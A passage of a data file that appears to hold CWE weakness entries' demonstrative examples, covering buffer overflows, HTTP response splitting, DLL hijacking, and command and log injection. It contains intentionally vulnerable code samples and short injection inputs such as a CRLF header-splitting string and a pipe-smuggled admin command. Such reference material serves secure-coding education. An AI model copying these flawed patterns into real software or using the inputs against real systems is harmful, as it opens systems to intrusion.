        "demonstrative_examples": "Example 1 In the following example the class RegistrationForm is a Struts framework ActionForm Bean that will maintain user input data from a registration webpage for an online business site. The user will enter registration data and, through the Struts framework, the RegistrationForm bean will maintain the user data in the form fields using the private member variables. The RegistrationForm class uses the Struts validation capability by extending the ValidatorForm class and including the validation for the form fields within the validator XML file, validator.xml. (bad code) Example Language: Java public class RegistrationForm extends org.apache.struts.validator.ValidatorForm { // private variables for registration form private String name; private String address; private String city; private String state; private String zipcode; // no longer using the phone form field // private String phone; private String email; public RegistrationForm() { super(); } // getter and setter methods for private variables ... } (bad code) Example Language: XML <form-validation> <formset> <form name=\"RegistrationForm\"> <field property=\"name\" depends=\"required\"> <arg position=\"0\" key=\"prompt.name\"/> </field> <field property=\"address\" depends=\"required\"> <arg position=\"0\" key=\"prompt.address\"/> </field> <field property=\"city\" depends=\"required\"> <arg position=\"0\" key=\"prompt.city\"/> </field> <field property=\"state\" depends=\"required,mask\"> <arg position=\"0\" key=\"prompt.state\"/> <var> <var-name>mask</var-name> <var-value>[a-zA-Z]{2}</var-value> </var> </field> <field property=\"zipcode\" depends=\"required,mask\"> <arg position=\"0\" key=\"prompt.zipcode\"/> <var> <var-name>mask</var-name> <var-value>\\\\d{5}</var-value> </var> </field> <field property=\"phone\" depends=\"required,mask\"> <arg position=\"0\" key=\"prompt.phone\"/> <var> <var-name>mask</var-name> <var-value>^([0-9]{3})(-)([0-9]{4}|[0-9]{4})$</var-value> </var> </field> <field property=\"email\" depends=\"required,email\"> <arg position=\"0\" key=\"prompt.email\"/> </field> </form> </formset> </form-validation> However, the validator XML file, validator.xml, for the RegistrationForm class includes the validation form for the user input form field \"phone\" that is no longer used by the input form and the RegistrationForm class. Any validation forms that are no longer required should be removed from the validator XML file, validator.xml. The existence of unused forms may be an indication to attackers that this code is out of date or poorly maintained."
    },
    {
        "id": 108,
        "demonstrative_examples": ""
    },
    {
        "id": 109,
        "demonstrative_examples": "Example 1 This mapping defines an action for a download form: (bad code) Example Language: XML <action path=\"/download\" type=\"com.website.d2.action.DownloadAction\" name=\"downloadForm\" scope=\"request\" input=\".download\" validate=\"false\"> </action> This mapping has disabled validation. Disabling validation exposes this action to numerous types of attacks."
    },
    {
        "id": 110,
        "demonstrative_examples": "Example 1 This example shows an inconsistency between an action form and a validation form. with a third field. This first block of code shows an action form that has two fields, startDate and endDate. (bad code) Example Language: Java public class DateRangeForm extends ValidatorForm { String startDate, endDate; public void setStartDate(String startDate) { this.startDate = startDate; } public void setEndDate(String endDate) { this.endDate = endDate; } } This second block of related code shows a validation form with a third field: scale. The presence of the third field suggests that DateRangeForm was modified without taking validation into account. (bad code) Example Language: XML <form name=\"DateRangeForm\"> <field property=\"startDate\" depends=\"date\"> <arg0 key=\"start.date\"/> </field> <field property=\"endDate\" depends=\"date\"> <arg0 key=\"end.date\"/> </field> <field property=\"scale\" depends=\"integer\"> <arg0 key=\"range.scale\"/> </field> </form>"
    },
    {
        "id": 111,
        "demonstrative_examples": "Example 1 The following code defines a class named Echo. The class declares one native method (defined below), which uses C to echo commands entered on the console back to the user. The following C code defines the native method implemented in the Echo class: (bad code) Example Language: Java class Echo { public native void runEcho(); static { System.loadLibrary(\"echo\"); } public static void main(String[] args) { new Echo().runEcho(); } } (bad code) Example Language: C #include <jni.h> #include \"Echo.h\"//the java class above compiled with javah #include <stdio.h> JNIEXPORT void JNICALL Java_Echo_runEcho(JNIEnv *env, jobject obj) { char buf[64]; gets(buf); printf(buf); } Because the example is implemented in Java, it may appear that it is immune to memory issues like buffer overflow vulnerabilities. Although Java does do a good job of making memory operations safe, this protection does not extend to vulnerabilities occurring in source code written in other languages that are accessed using the Java Native Interface. Despite the memory protections offered in Java, the C code in this example is vulnerable to a buffer overflow because it makes use of gets(), which does not check the length of its input. The Sun Java(TM) Tutorial provides the following description of JNI [See Reference]: The JNI framework lets your native method utilize Java objects in the same way that Java code uses these objects. A native method can create Java objects, including arrays and strings, and then inspect and use these objects to perform its tasks. A native method can also inspect and use objects created by Java application code. A native method can even update Java objects that it created or that were passed to it, and these updated objects are available to the Java application. Thus, both the native language side and the Java side of an application can create, update, and access Java objects and then share these objects between them. The vulnerability in the example above could easily be detected through a source code audit of the native method implementation. This may not be practical or possible depending on the availability of the C source code and the way the project is built, but in many cases it may suffice. However, the ability to share objects between Java and native methods expands the potential risk to much more insidious cases where improper data handling in Java may lead to unexpected vulnerabilities in native code or unsafe operations in native code corrupt data structures in Java. Vulnerabilities in native code accessed through a Java application are typically exploited in the same manner as they are in applications written in the native language. The only challenge to such an attack is for the attacker to identify that the Java application uses native code to perform certain operations. This can be accomplished in a variety of ways, including identifying specific behaviors that are often implemented with native code or by exploiting a system information exposure in the Java application that reveals its use of JNI [See Reference]."
    },
    {
        "id": 112,
        "demonstrative_examples": "Example 1 The following code loads and parses an XML file. (bad code) Example Language: Java // Read DOM try { ... DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); factory.setValidating( false ); .... c_dom = factory.newDocumentBuilder().parse( xmlFile ); } catch(Exception ex) { ... } The XML file is loaded without validating it against a known XML Schema or DTD. Example 2 The following code creates a DocumentBuilder object to be used in building an XML document. (bad code) Example Language: Java DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance(); builderFactory.setNamespaceAware(true); DocumentBuilder builder = builderFactory.newDocumentBuilder(); The DocumentBuilder object does not validate an XML document against a schema, making it possible to create an invalid XML document."
    },
    {
        "id": 113,
        "demonstrative_examples": "Example 1 The following code segment reads the name of the author of a weblog entry, author, from an HTTP request and sets it in a cookie header of an HTTP response. (bad code) Example Language: Java String author = request.getParameter(AUTHOR_PARAM); ... Cookie cookie = new Cookie(\"author\", author); cookie.setMaxAge(cookieExpiration); response.addCookie(cookie); Assuming a string consisting of standard alpha-numeric characters, such as \"Jane Smith\", is submitted in the request the HTTP response including this cookie might take the following form: (result) HTTP/1.1 200 OK ... Set-Cookie: author=Jane Smith ... However, because the value of the cookie is formed of unvalidated user input the response will only maintain this form if the value submitted for AUTHOR_PARAM does not contain any CR and LF characters. If an attacker submits a malicious string, such as (attack code) Wiley Hacker\\\\r\\\\nHTTP/1.1 200 OK\\\\r\\\\n then the HTTP response would be split into two responses of the following form: (result) HTTP/1.1 200 OK ... Set-Cookie: author=Wiley Hacker HTTP/1.1 200 OK ... Clearly, the second response is completely controlled by the attacker and can be constructed with any header and body content desired. The ability of attacker to construct arbitrary HTTP responses permits a variety of resulting attacks, including: cross-user defacement web and browser cache poisoning cross-site scripting page hijacking Example 2 An attacker can make a single request to a vulnerable server that will cause the server to create two responses, the second of which may be misinterpreted as a response to a different request, possibly one made by another user sharing the same TCP connection with the sever. Cross-User Defacement This can be accomplished by convincing the user to submit the malicious request themselves, or remotely in situations where the attacker and the user share a common TCP connection to the server, such as a shared proxy server. In the best case, an attacker can leverage this ability to convince users that the application has been hacked, causing users to lose confidence in the security of the application. In the worst case, an attacker may provide specially crafted content designed to mimic the behavior of the application but redirect private information, such as account numbers and passwords, back to the attacker. Example 3 The impact of a maliciously constructed response can be magnified if it is cached either by a web cache used by multiple users or even the browser cache of a single user. Cache Poisoning If a response is cached in a shared web cache, such as those commonly found in proxy servers, then all users of that cache will continue receive the malicious content until the cache entry is purged. Similarly, if the response is cached in the browser of an individual user, then that user will continue to receive the malicious content until the cache entry is purged, although the user of the local browser instance will be affected. Example 4 Once attackers have control of the responses sent by an application, they have a choice of a variety of malicious content to provide users. Cross-Site Scripting \"Cross-site scripting is common form of attack where malicious JavaScript or other code included in a response is executed in the user's browser.\" \"The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\" \"The most common and dangerous attack vector against users of a vulnerable application uses JavaScript to transmit session and authentication information back to the attacker who can then take complete control of the victim's account.\" Example 5 In addition to using a vulnerable application to send malicious content to a user, the same root vulnerability can also be leveraged to redirect sensitive content generated by the server and intended for the user to the attacker instead. Page Hijacking By submitting a request that results in two responses, the intended response from the server and the response generated by the attacker, an attacker can cause an intermediate node, such as a shared proxy server, to misdirect a response generated by the server for the user to the attacker. \"Because the request made by the attacker generates two responses, the first is interpreted as a response to the attacker's request, while the second remains in limbo. When the user makes a legitimate request through the same TCP connection, the attacker's request is already waiting and is interpreted as a response to the victim's request. The attacker then sends a second request to the server, to which the proxy server responds with the server generated request intended for the victim, thereby compromising any sensitive information in the headers or body of the response intended for the victim.\""
    },
    {
        "id": 114,
        "demonstrative_examples": "Example 1 The following code uses System.loadLibrary() to load code from a native library named library.dll, which is normally found in a standard system directory. (bad code) Example Language: Java ... System.loadLibrary(\"library.dll\"); ... \"The problem here is that System.loadLibrary() accepts a library name, not a path, for the library to be loaded. From the Java 1.4.2 API documentation this function behaves as follows [1]: A file containing native code is loaded from the local file system from a place where library files are conventionally obtained. The details of this process are implementation-dependent. The mapping from a library name to a specific filename is done in a system-specific manner. If an attacker is able to place a malicious copy of library.dll higher in the search order than file the application intends to load, then the application will load the malicious copy instead of the intended file. Because of the nature of the application, it runs with elevated privileges, which means the contents of the attacker's library.dll will now be run with elevated privileges, possibly giving them complete control of the system.\" Example 2 The following code from a privileged application uses a registry entry to determine the directory in which it is installed and loads a library file based on a relative path from the specified directory. (bad code) Example Language: C ... RegQueryValueEx(hkey, \"APPHOME\", 0, 0, (BYTE*)home, &size); char* lib=(char*)malloc(strlen(home)+strlen(INITLIB)); if (lib) { strcpy(lib,home); strcat(lib,INITCMD); LoadLibrary(lib); } ... The code in this example allows an attacker to load an arbitrary library, from which code will be executed with the elevated privilege of the application, by modifying a registry key to specify a different path containing a malicious version of INITLIB. Because the program does not validate the value read from the environment, if an attacker can control the value of APPHOME, they can fool the application into running malicious code. Example 3 The following code is from a web-based administration utility that allows users access to an interface through which they can update their profile on the system. The utility makes use of a library named liberty.dll, which is normally found in a standard system directory. (bad code) Example Language: C LoadLibrary(\"liberty.dll\"); \"The problem is that the program does not specify an absolute path for liberty.dll. If an attacker is able to place a malicious library named liberty.dll higher in the search order than file the application intends to load, then the application will load the malicious copy instead of the intended file. Because of the nature of the application, it runs with elevated privileges, which means the contents of the attacker's liberty.dll will now be run with elevated privileges, possibly giving the attacker complete control of the system. The type of attack seen in this example is made possible because of the search order used by LoadLibrary() when an absolute path is not specified. If the current directory is searched before system directories, as was the case up until the most recent versions of Windows, then this type of attack becomes trivial if the attacker can execute the program locally. The search order is operating system version dependent, and is controlled on newer operating systems by the value of the registry key: HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\SafeDllSearchMode\""
    },
    {
        "id": 115,
        "demonstrative_examples": ""
    },
    {
        "id": 116,
        "demonstrative_examples": "Example 1 This code displays an email address that was submitted as part of a form. (bad code) Example Language: JSP <% String email = request.getParameter(\"email\"); %> ... Email Address: <%= email %> The value read from the form parameter is reflected back to the client browser without having been encoded prior to output, allowing various XSS attacks ( CWE-79 ). Example 2 Consider a chat application in which a front-end web application communicates with a back-end server. The back-end is legacy code that does not perform authentication or authorization, so the front-end must implement it. The chat protocol supports two commands, SAY and BAN, although only administrators can use the BAN command. Each argument must be separated by a single space. The raw inputs are URL-encoded. The messaging protocol allows multiple commands to be specified on the same line if they are separated by a \"|\" character. \"First let's look at the back end command processor code\" (bad code) Example Language: Perl $inputString = readLineFromFileHandle($serverFH); # generate an array of strings separated by the \"|\" character. @commands = split(/\\\\|/, $inputString); foreach $cmd (@commands) { # separate the operator from its arguments based on a single whitespace ($operator, $args) = split(/ /, $cmd, 2); $args = UrlDecode($args); if ($operator eq \"BAN\") { ExecuteBan($args); } elsif ($operator eq \"SAY\") { ExecuteSay($args); } } The front end web application receives a command, encodes it for sending to the server, performs the authorization check, and sends the command to the server. (bad code) Example Language: Perl $inputString = GetUntrustedArgument(\"command\"); ($cmd, $argstr) = split(/\\\\s+/, $inputString, 2); \"# removes extra whitespace and also changes CRLF's to spaces\" $argstr =~ s/\\\\s+/ /gs; $argstr = UrlEncode($argstr); if (($cmd eq \"BAN\") && (! IsAdministrator($username))) { die \"Error: you are not the admin.\\\\n\"; } # communicate with file server using a file handle $fh = GetServerFileHandle(\"myserver\"); print $fh \"$cmd $argstr\\\\n\"; It is clear that, while the protocol and back-end allow multiple commands to be sent in a single request, the front end only intends to send a single command. However, the UrlEncode function could leave the \"|\" character intact. If an attacker provides: (attack code) SAY hello world|BAN user12 then the front end will see this is a \"SAY\" command, and the $argstr will look like \"hello world | BAN user12\". Since the command is \"SAY\", the check for the \"BAN\" command will fail, and the front end will send the URL-encoded command to the back end: (result) SAY hello%20world|BAN%20user12 The back end, however, will treat these as two separate commands: (result) SAY hello world BAN user12 Notice, however, that if the front end properly encodes the \"|\" with \"%7C\", then the back end will only process a single command. Example 3 This example takes user input, passes it through an encoding scheme and then creates a directory specified by the user. (bad code) Example Language: Perl sub GetUntrustedInput { return($ARGV[0]); } sub encode { my($str) = @_; $str =~ s/\\\\&/\\\\&amp;/gs; $str =~ s/\\\\\"/\\\\&quot;/gs; \"$str =~ s/\\\\'/\\\\&apos;/gs;\" $str =~ s/\\\\</\\\\&lt;/gs; $str =~ s/\\\\>/\\\\&gt;/gs; return($str); } sub doit { my $uname = encode(GetUntrustedInput(\"username\")); print \"<b>Welcome, $uname!</b><p>\\\\n\"; system(\"cd /home/$uname; /bin/ls -l\"); } The programmer attempts to encode dangerous characters, however the denylist for encoding is incomplete ( CWE-184 ) and an attacker can still pass a semicolon, resulting in a chain with command injection ( CWE-77 ). \"Additionally, the encoding routine is used inappropriately with command execution. An attacker doesn't even need to insert their own semicolon. The attacker can instead leverage the encoding routine to provide the semicolon to separate the commands. If an attacker supplies a string of the form:\" (attack code) \"' pwd\" then the program will encode the apostrophe and insert the semicolon, which functions as a command separator when passed to the system function. This allows the attacker to complete the command injection."
    },
    {
        "id": 117,
        "demonstrative_examples": "Example 1 The following web application code attempts to read an integer value from a request object. If the parseInt call fails, then the input is logged with an error message indicating what happened. (bad code) Example Language: Java String val = request.getParameter(\"val\"); try { int value = Integer.parseInt(val); } catch (NumberFormatException) { log.info(\"Failed to parse val = \" + val); } ... If a user submits the string \"twenty-one\" for val, the following entry is logged: INFO: Failed to parse val=twenty-one However, if an attacker submits the string \"twenty-one%0a%0aINFO:+User+logged+out%3dbadguy\", the following entry is logged: INFO: Failed to parse val=twenty-one INFO: User logged out=badguy Clearly, attackers can use this same mechanism to insert arbitrary log entries."
    },
    {
        "id": 118,
        "demonstrative_examples": ""
    },
    {
        "id": 119,
        "demonstrative_examples": "Example 1 This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer. (bad code) Example Language: C void host_lookup(char *user_supplied_addr){ struct hostent *hp; in_addr_t *addr; char hostname[64]; in_addr_t inet_addr(const char *cp); /*routine that ensures user_supplied_addr is in the right format for conversion */ validate_addr_form(user_supplied_addr); addr = inet_addr(user_supplied_addr); hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET); strcpy(hostname, hp->h_name); } This function allocates a buffer of 64 bytes to store the hostname, however there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then we may overwrite sensitive data or even relinquish control flow to the attacker. Note that this example also contains an unchecked return value ( CWE-252 ) that can lead to a NULL pointer dereference ( CWE-476 ). Example 2 This example applies an encoding procedure to an input string and stores it into a buffer. (bad code) Example Language: C char * copy_input(char *user_supplied_string){ int i, dst_index; char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE); if ( MAX_SIZE <= strlen(user_supplied_string) ){ die(\"user string too long, die evil hacker!\"); } dst_index = 0; for ( i = 0; i < strlen(user_supplied_string); i++ ){ \"if( '&' == user_supplied_string[i] ){\" \"dst_buf[dst_index++] = '&';\" \"dst_buf[dst_index++] = 'a';\" \"dst_buf[dst_index++] = 'm';\" \"dst_buf[dst_index++] = 'p';\" \"dst_buf[dst_index++] = ';';\" } \"else if ('<' == user_supplied_string[i] ){\" /* encode to &lt; */ } else dst_buf[dst_index++] = user_supplied_string[i]; } return dst_buf; } The programmer attempts to encode the ampersand character in the user-controlled string, however the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands. Example 3 The following example asks a user for an offset into an array to select an item. (bad code) Example Language: C int main (int argc, char **argv) { char *items[] = {\"boat\", \"car\", \"truck\", \"train\"}; int index = GetUntrustedOffset(); printf(\"You selected %s\\\\n\", items[index-1]); } The programmer allows the user to specify which element in the list to select, however an attacker can provide an out-of-bounds offset, resulting in a buffer over-read ( CWE-126 ). Example 4 In the following code, the method retrieves a value from an array at a specific array index location that is given as an input parameter to the method (bad code) Example Language: C int getValueFromArray(int *array, int len, int index) { int value; // check that the array index is less than the maximum // length of the array if (index < len) { // get the value at the specified index of the array value = array[index]; } // if array index is invalid then output error message // and return value indicating error else { printf(\"Value is: %d\\\\n\", array[index]); value = -1; } return value; } However, this method only verifies that the given array index is less than the maximum length of the array but does not check for the minimum value ( CWE-839 ). This will allow a negative value to be accepted as the input array index, which will result in a out of bounds read ( CWE-125 ) and may allow access to sensitive memory. The input array index should be checked to verify that is within the maximum and minimum range required for the array ( CWE-129 ). In this example the if statement should be modified to include a minimum range check, as shown below. (good code) Example Language: C ... // check that the array index is within the correct // range of values for the array if (index >= 0 && index < len) { ... Example 5 Windows provides the _mbs family of functions to perform various operations on multibyte strings. When these functions are passed a malformed multibyte string, such as a string containing a valid leading byte followed by a single null byte, they can read or write past the end of the string buffer causing a buffer overflow. The following functions all pose a risk of buffer overflow: _mbsinc _mbsdec _mbsncat _mbsncpy _mbsnextc _mbsnset _mbsrev _mbsset _mbsstr _mbstok _mbccpy _mbslen"
    },
    {
        "id": 120,
        "demonstrative_examples": "Example 1 The following code asks the user to enter their last name and then attempts to store the value entered in the last_name array. (bad code) Example Language: C char last_name[20]; printf (\"Enter your last name: \"); scanf (\"%s\", last_name); The problem with the code above is that it does not restrict or limit the size of the name entered by the user. If the user enters \"Very_very_long_last_name\" which is 24 characters long, then a buffer overflow will occur since the array can only hold 20 characters total. Example 2 The following code attempts to create a local copy of a buffer to perform some manipulations to the data. (bad code) Example Language: C void manipulate_string(char * string){ char buf[24]; strcpy(buf, string); ... } However, the programmer does not ensure that the size of the data pointed to by string will fit in the local buffer and copies the data with the potentially dangerous strcpy() function. This may result in a buffer overflow condition if an attacker can influence the contents of the string parameter. Example 3 The code below calls the gets() function to read in data from the command line. (bad code) Example Language: C char buf[24]; printf(\"Please enter your name and press <Enter>\\\\n\"); gets(buf); ... } However, gets() is inherently unsafe, because it copies all input from STDIN to the buffer without checking size. This allows the user to provide a string that is larger than the buffer size, resulting in an overflow condition. Example 4 In the following example, a server accepts connections from a client and processes the client request. After accepting a client connection, the program will obtain client information using the gethostbyaddr method, copy the hostname of the client that connected to a local variable and output the hostname of the client to a log file. (bad code) Example Language: C ... struct hostent *clienthp; char hostname[MAX_LEN]; // create server socket, bind to server address and listen on socket ... // accept client connections and process requests int count = 0; for (count = 0; count < MAX_CONNECTIONS; count++) { int clientlen = sizeof(struct sockaddr_in); int clientsocket = accept(serversocket, (struct sockaddr *)&clientaddr, &clientlen); if (clientsocket >= 0) { clienthp = gethostbyaddr((char*) &clientaddr.sin_addr.s_addr, sizeof(clientaddr.sin_addr.s_addr), AF_INET); strcpy(hostname, clienthp->h_name); logOutput(\"Accepted client connection from host \", hostname); // process client request ... close(clientsocket); } } close(serversocket); ... However, the hostname of the client that connected may be longer than the allocated size for the local hostname variable. This will result in a buffer overflow when copying the client hostname to the local variable using the strcpy method."
    },
    {
        "id": 121,
        "demonstrative_examples": "Example 1 While buffer overflow examples can be rather complex, it is possible to have very simple, yet still exploitable, stack-based buffer overflows: (bad code) Example Language: C #define BUFSIZE 256 int main(int argc, char **argv) { char buf[BUFSIZE]; strcpy(buf, argv[1]); } The buffer size is fixed, but there is no guarantee the string in argv[1] will not exceed this size and cause an overflow. Example 2 This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer. (bad code) Example Language: C void host_lookup(char *user_supplied_addr){ struct hostent *hp; in_addr_t *addr; char hostname[64]; in_addr_t inet_addr(const char *cp); /*routine that ensures user_supplied_addr is in the right format for conversion */ validate_addr_form(user_supplied_addr); addr = inet_addr(user_supplied_addr); hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET); strcpy(hostname, hp->h_name); } This function allocates a buffer of 64 bytes to store the hostname, however there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then we may overwrite sensitive data or even relinquish control flow to the attacker. Note that this example also contains an unchecked return value ( CWE-252 ) that can lead to a NULL pointer dereference ( CWE-476 )."
    },
    {
        "id": 122,
        "demonstrative_examples": "Example 1 While buffer overflow examples can be rather complex, it is possible to have very simple, yet still exploitable, heap-based buffer overflows: (bad code) Example Language: C #define BUFSIZE 256 int main(int argc, char **argv) { char *buf; buf = (char *)malloc(sizeof(char)*BUFSIZE); strcpy(buf, argv[1]); } The buffer is allocated heap memory with a fixed size, but there is no guarantee the string in argv[1] will not exceed this size and cause an overflow. Example 2 This example applies an encoding procedure to an input string and stores it into a buffer. (bad code) Example Language: C char * copy_input(char *user_supplied_string){ int i, dst_index; char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE); if ( MAX_SIZE <= strlen(user_supplied_string) ){ die(\"user string too long, die evil hacker!\"); } dst_index = 0; for ( i = 0; i < strlen(user_supplied_string); i++ ){ \"if( '&' == user_supplied_string[i] ){\" \"dst_buf[dst_index++] = '&';\" \"dst_buf[dst_index++] = 'a';\" \"dst_buf[dst_index++] = 'm';\" \"dst_buf[dst_index++] = 'p';\" \"dst_buf[dst_index++] = ';';\" } \"else if ('<' == user_supplied_string[i] ){\" /* encode to &lt; */ } else dst_buf[dst_index++] = user_supplied_string[i]; } return dst_buf; } The programmer attempts to encode the ampersand character in the user-controlled string, however the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands."
    },
    {
        "id": 123,
        "demonstrative_examples": "Example 1 The classic example of a write-what-where condition occurs when the accounting information for memory allocations is overwritten in a particular fashion. Here is an example of potentially vulnerable code: (bad code) Example Language: C #define BUFSIZE 256 int main(int argc, char **argv) { char *buf1 = (char *) malloc(BUFSIZE); char *buf2 = (char *) malloc(BUFSIZE); strcpy(buf1, argv[1]); free(buf2); } Vulnerability in this case is dependent on memory layout. The call to strcpy() can be used to write past the end of buf1, and, with a typical layout, can overwrite the accounting information that the system keeps for buf2 when it is allocated. Note that if the allocation header for buf2 can be overwritten, buf2 itself can be overwritten as well. The allocation header will generally keep a linked list of memory \"chunks\". Particularly, there may be a \"previous\" chunk and a \"next\" chunk. Here, the previous chunk for buf2 will probably be buf1, and the next chunk may be null. When the free() occurs, most memory allocators will rewrite the linked list using data from buf2. Particularly, the \"next\" chunk for buf1 will be updated and the \"previous\" chunk for any subsequent chunk will be updated. The attacker can insert a memory address for the \"next\" chunk and a value to write into that memory address for the \"previous\" chunk. This could be used to overwrite a function pointer that gets dereferenced later, replacing it with a memory address that the attacker has legitimate access to, where they have placed malicious code, resulting in arbitrary code execution."
    },
    {
        "id": 124,
        "demonstrative_examples": "Example 1 In the following C/C++ example, a utility function is used to trim trailing whitespace from a character string. The function copies the input string to a local character string and uses a while statement to remove the trailing whitespace by moving backward through the string and overwriting whitespace with a NUL character. (bad code) Example Language: C char* trimTrailingWhitespace(char *strMessage, int length) { char *retMessage; char *message = malloc(sizeof(char)*(length+1)); // copy input string to a temporary string char message[length+1]; int index; for (index = 0; index < length; index++) { message[index] = strMessage[index]; } \"message[index] = '\\\\0';\" // trim trailing whitespace int len = index-1; while (isspace(message[len])) { \"message[len] = '\\\\0';\" len--; } // return string without trailing whitespace retMessage = message; return retMessage; } However, this function can cause a buffer underwrite if the input character string contains all whitespace. On some systems the while statement will move backwards past the beginning of a character string and will call the isspace() function on an address outside of the bounds of the local buffer. Example 2 The following is an example of code that may result in a buffer underwrite, if find() returns a negative value to indicate that ch is not found in srcBuf: (bad code) Example Language: C int main() { ... strncpy(destBuf, &srcBuf[find(srcBuf, ch)], 1024); ... } If the index to srcBuf is somehow under user control, this is an arbitrary write-what-where condition."
    },
    {
        "id": 125,
        "demonstrative_examples": "Example 1 In the following code, the method retrieves a value from an array at a specific array index location that is given as an input parameter to the method (bad code) Example Language: C int getValueFromArray(int *array, int len, int index) { int value; // check that the array index is less than the maximum // length of the array if (index < len) { // get the value at the specified index of the array value = array[index]; } // if array index is invalid then output error message // and return value indicating error else { printf(\"Value is: %d\\\\n\", array[index]); value = -1; } return value; } However, this method only verifies that the given array index is less than the maximum length of the array but does not check for the minimum value ( CWE-839 ). This will allow a negative value to be accepted as the input array index, which will result in a out of bounds read ( CWE-125 ) and may allow access to sensitive memory. The input array index should be checked to verify that is within the maximum and minimum range required for the array ( CWE-129 ). In this example the if statement should be modified to include a minimum range check, as shown below. (good code) Example Language: C ... // check that the array index is within the correct // range of values for the array if (index >= 0 && index < len) { ..."
    },
    {
        "id": 126,
        "demonstrative_examples": "Example 1 In the following C/C++ example the method processMessageFromSocket() will get a message from a socket, placed into a buffer, and will parse the contents of the buffer into a structure that contains the message length and the message body. A for loop is used to copy the message body into a local character string which will be passed to another method for processing. (bad code) Example Language: C int processMessageFromSocket(int socket) { int success; char buffer[BUFFER_SIZE]; char message[MESSAGE_SIZE]; // get message from socket and store into buffer //Ignoring possibliity that buffer > BUFFER_SIZE if (getMessage(socket, buffer, BUFFER_SIZE) > 0) { // place contents of the buffer into message structure ExMessage *msg = recastBuffer(buffer); // copy message body into string for processing int index; for (index = 0; index < msg->msgLength; index++) { message[index] = msg->msgBody[index]; } \"message[index] = '\\\\0';\" // process message success = processMessage(message); } return success; } However, the message length variable from the structure is used as the condition for ending the for loop without validating that the message length variable accurately reflects the length of the message body ( CWE-606 ). This can result in a buffer over-read ( CWE-125 ) by reading from memory beyond the bounds of the buffer if the message length variable indicates a length that is longer than the size of a message body ( CWE-130 ). Example 2 The following C/C++ example demonstrates a buffer over-read due to a missing NULL terminator. The main method of a pattern matching utility that looks for a specific pattern within a specific file uses the string strncopy() method to copy the command line user input file name and pattern to the Filename and Pattern character arrays respectively. (bad code) Example Language: C int main(int argc, char **argv) { char Filename[256]; char Pattern[32]; /* Validate number of parameters and ensure valid content */ ... /* copy filename parameter to variable, may cause off-by-one overflow */ strncpy(Filename, argv[1], sizeof(Filename)); /* copy pattern parameter to variable, may cause off-by-one overflow */ strncpy(Pattern, argv[2], sizeof(Pattern)); printf(\"Searching file: %s for the pattern: %s\\\\n\", Filename, Pattern); Scan_File(Filename, Pattern); } However, the code do not take into account that strncpy() will not add a NULL terminator when the source buffer is equal in length of longer than that provide size attribute. Therefore if a user enters a filename or pattern that are the same size as (or larger than) their respective character arrays, a NULL terminator will not be added ( CWE-170 ) which leads to the printf() read beyond the expected end of the Filename and Pattern buffers. To fix this problem, be sure to subtract 1 from the sizeof() call to allow room for the null byte to be added. (good code) Example Language: C /* copy filename parameter to variable, no off-by-one overflow */ strncpy(Filename, argv[2], sizeof(Filename)-1); \"Filename[255]='\\\\0';\" /* copy pattern parameter to variable, no off-by-one overflow */ strncpy(Pattern, argv[3], sizeof(Pattern)-1); \"Pattern[31]='\\\\0';\""
    },
    {
        "id": 127,
        "demonstrative_examples": ""
    },
    {
        "id": 128,
        "demonstrative_examples": "Example 1 The following image processing code allocates a table for images. (bad code) Example Language: C img_t table_ptr; /*struct containing img data, 10kB each*/ int num_imgs; ... num_imgs = get_num_imgs(); table_ptr = (img_t*)malloc(sizeof(img_t)*num_imgs); ... This code intends to allocate a table of size num_imgs, however as num_imgs grows large, the calculation determining the size of the list will eventually overflow ( CWE-190 ). This will result in a very small list to be allocated instead. If the subsequent code operates on the list as if it were num_imgs long, it may result in many types of out-of-bounds problems ( CWE-119 )."
    },
    {
        "id": 129,
        "demonstrative_examples": "Example 1 In the code snippet below, an untrusted integer value is used to reference an object in an array. (bad code) Example Language: Java public String getValue(int index) { return array[index]; } If index is outside of the range of the array, this may result in an ArrayIndexOutOfBounds Exception being raised. Example 2 The following example takes a user-supplied value to allocate an array of objects and then operates on the array. (bad code) Example Language: Java private void buildList ( int untrustedListSize ){ if ( 0 > untrustedListSize ){ die(\"Negative value supplied for list size, die evil hacker!\"); } Widget[] list = new Widget [ untrustedListSize ]; list[0] = new Widget(); } This example attempts to build a list from a user-specified value, and even checks to ensure a non-negative value is supplied. If, however, a 0 value is provided, the code will build an array of size 0 and then try to store a new Widget in the first location, causing an exception to be thrown. Example 3 In the following code, the method retrieves a value from an array at a specific array index location that is given as an input parameter to the method (bad code) Example Language: C int getValueFromArray(int *array, int len, int index) { int value; // check that the array index is less than the maximum // length of the array if (index < len) { // get the value at the specified index of the array value = array[index]; } // if array index is invalid then output error message // and return value indicating error else { printf(\"Value is: %d\\\\n\", array[index]); value = -1; } return value; } However, this method only verifies that the given array index is less than the maximum length of the array but does not check for the minimum value ( CWE-839 ). This will allow a negative value to be accepted as the input array index, which will result in a out of bounds read ( CWE-125 ) and may allow access to sensitive memory. The input array index should be checked to verify that is within the maximum and minimum range required for the array ( CWE-129 ). In this example the if statement should be modified to include a minimum range check, as shown below. (good code) Example Language: C ... // check that the array index is within the correct // range of values for the array if (index >= 0 && index < len) { ... Example 4 The following example retrieves the sizes of messages for a pop3 mail server. The message sizes are retrieved from a socket that returns in a buffer the message number and the message size, the message number (num) and size (size) are extracted from 